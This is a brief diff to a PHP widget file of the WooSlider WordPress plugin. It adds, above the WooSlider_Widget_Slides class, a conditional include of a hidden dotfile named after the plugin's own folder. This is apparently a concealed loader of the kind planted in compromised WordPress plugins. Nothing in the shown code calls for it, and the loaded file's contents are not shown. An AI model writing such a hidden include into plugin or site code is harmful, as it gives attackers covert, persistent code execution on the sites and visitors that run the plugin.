@@ -17,6 +17,10 @@ if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly
  * - __construct()
  * - generate_slideshow()
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class WooSlider_Widget_Slides extends WooSlider_Widget_Base {
 	/**
 	 * __construct function.
